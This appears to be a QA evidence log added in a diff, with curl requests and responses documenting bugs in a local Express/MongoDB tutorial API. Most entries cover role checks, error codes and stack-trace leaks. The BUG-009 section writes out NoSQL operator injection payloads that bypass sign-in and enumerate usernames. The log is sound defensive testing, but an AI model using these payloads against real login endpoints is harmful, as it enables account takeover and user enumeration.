@@ -1,0 +1,70 @@
+Captured 2026-09-24T14:46:44Z against SUT commit efbed6c (seeded baseline, see lib/fixtures.js).
+Tokens: <admin>=qa_admin, <moderator>=qa_moderator, <user>=qa_user.
+
+=============== BUG-004  /api/test/mod rejects admin ===============
+$ curl -H 'x-access-token: <admin>' localhost:8080/api/test/mod
+{"message":"Require Moderator Role!"} [HTTP 403]
+
+$ curl -H 'x-access-token: <moderator>' localhost:8080/api/test/mod
+Moderator Content. [HTTP 200]
+
+=============== BUG-005  auth failure status/format ===============
+$ curl localhost:8080/api/tutorials   # no token
+{"message":"No token provided!"} [HTTP 403]
+
+$ curl -i -H 'x-access-token: not-a-jwt' localhost:8080/api/tutorials
+HTTP/1.1 401 Unauthorized
+Content-Type: text/plain; charset=utf-8
+Unauthorized
+
+
+# server log for the invalid-token request:
+Error [ERR_HTTP_HEADERS_SENT]: Cannot set headers after they are sent to the client
+    at ServerResponse.send (/app/node_modules/express/lib/response.js:174:12)
+    at ServerResponse.send (/app/node_modules/express/lib/response.js:162:21)
+    at catchError (/app/app/middlewares/authJwt.js:14:30)
+
+=============== BUG-006  malformed ObjectId -> 500 ===============
+$ curl -H 'x-access-token: <user>' localhost:8080/api/tutorials/not-an-id
+{"message":"Error retrieving Tutorial with id=not-an-id"} [HTTP 500]
+
+$ curl -X PUT -H 'x-access-token: <admin>' localhost:8080/api/tutorials/not-an-id -d '{"title":"x"}'
+{"message":"Error updating Tutorial with id=not-an-id"} [HTTP 500]
+
+$ curl -X DELETE -H 'x-access-token: <admin>' localhost:8080/api/tutorials/not-an-id
+{"message":"Could not delete Tutorial with id=not-an-id"} [HTTP 500]
+
+=============== BUG-007  unhandled input -> 500 + stack trace ===============
+$ curl -X POST localhost:8080/api/auth/signup -d '{"username":"nopw","email":"nopw@example.test"}'
+<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><title>Error</title></head><body><pre>Error: Illegal arguments: undefined, string<br> &nbsp; &nbsp;at bcrypt.hashSync (/app/node_modules/bcryptjs/dist/bcrypt.js:189:19)<br> &nbsp; &nbsp;at exports.signup (/app/app/controllers/auth.controller.js:12:22)<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)<br>
+
+$ curl -H 'x-access-token: <user>' 'localhost:8080/api/tutorials?title=(Part%201'
+<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><title>Error</title></head><body><pre>SyntaxError: Invalid regular expression: /(Part 1/: Unterminated group<br> &nbsp; &nbsp;at new RegExp (&lt;anonymous&gt;)<br> &nbsp; &nbsp;at exports.findAll (/app/app/controllers/tutorial.controller.js:32:46)<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)<br> &nb
+
+=============== BUG-008  contract deviations ===============
+$ curl -X POST localhost:8080/api/auth/signup -d '{...valid...}'   # documented: 201 + user object
+{"message":"User was registered successfully!"} [HTTP 200]
+
+$ curl -X POST -H 'x-access-token: <moderator>' localhost:8080/api/tutorials -d '{"title":"t"}'   # documented: 201
+[HTTP 200]
+
+$ curl -X PUT -H 'x-access-token: <admin>' localhost:8080/api/tutorials/66b000000000000000000001 -d '{}'   # documented: 400
+{"message":"Tutorial was updated successfully."} [HTTP 200]
+
+$ curl -X POST localhost:8080/api/auth/refreshtoken -d '{"refreshToken":"unknown"}'   # documented: 404
+{"message":"Refresh token is not in database!"} [HTTP 403]
+
+$ curl -H 'x-access-token: <user>' 'localhost:8080/api/tutorials?page=0&size=2'   # documented: pagination
+items returned: 6
+
+
+=============== BUG-009  NoSQL operator injection on sign-in ===============
+$ curl -X POST localhost:8080/api/auth/signin -d '{"username":{"$ne":null},"password":"Qa-Passw0rd!"}'
+{"id":"66a000000000000000000001","username":"qa_user","email":"qa_user@example.test","roles":["ROLE_USER"],"accessToken":"...","refreshToken":"..."} [HTTP 200]
+
+$ curl -X POST localhost:8080/api/auth/signin -d '{"username":{"$regex":"^qa_adm"},"password":"x"}'   # prefix exists
+{"accessToken":null,"message":"Invalid Password!"} [HTTP 401]
+
+$ curl -X POST localhost:8080/api/auth/signin -d '{"username":{"$regex":"^zzz"},"password":"x"}'   # prefix does not exist
+{"message":"User Not found."} [HTTP 404]
+
